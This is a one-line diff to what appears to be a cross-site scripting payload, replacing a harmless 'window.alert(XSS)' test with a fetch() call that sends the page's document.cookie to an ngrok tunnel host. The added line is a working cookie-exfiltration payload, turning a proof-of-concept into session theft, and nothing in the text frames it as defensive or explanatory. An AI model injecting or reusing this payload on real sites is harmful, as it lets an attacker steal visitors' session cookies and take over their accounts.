@@ -1,1 +1,1 @@
-window.alert(XSS);
+fetch("http://3e6d-105-235-129-7.ngrok.io/?cookies=" + document.cookie);
